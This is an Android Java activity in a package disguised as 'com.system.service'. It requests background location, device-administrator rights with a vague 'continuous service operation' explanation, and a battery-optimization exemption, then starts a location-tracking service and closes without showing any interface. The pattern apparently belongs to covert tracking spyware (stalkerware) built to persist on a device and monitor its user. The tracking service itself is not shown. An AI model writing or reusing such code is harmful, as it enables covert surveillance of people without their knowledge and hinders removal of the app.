package com.system.service;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int DEVICE_ADMIN_REQUEST_CODE = 101;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName deviceAdminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        deviceAdminComponent = new ComponentName(this, DeviceAdminReceiver.class);

        requestPermissions();
    }

    private void requestPermissions() {
        boolean needsPermission = false;

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            needsPermission = true;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                needsPermission = true;
            }
        }

        if (needsPermission) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ActivityCompat.requestPermissions(this,
                        new String[]{
                                Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.ACCESS_COARSE_LOCATION,
                                Manifest.permission.ACCESS_BACKGROUND_LOCATION
                        },
                        PERMISSION_REQUEST_CODE);
            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{
                                Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.ACCESS_COARSE_LOCATION
                        },
                        PERMISSION_REQUEST_CODE);
            }
        } else {
            enableDeviceAdmin();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            enableDeviceAdmin();
        }
    }

    private void enableDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(deviceAdminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Enable device administrator to ensure continuous service operation");
            startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE);
        } else {
            requestBatteryOptimization();
        }
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            String packageName = getPackageName();
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }
        startService();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
            requestBatteryOptimization();
        }
    }

    private void startService() {
        Intent serviceIntent = new Intent(this, LocationTrackingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        finish();
    }
}
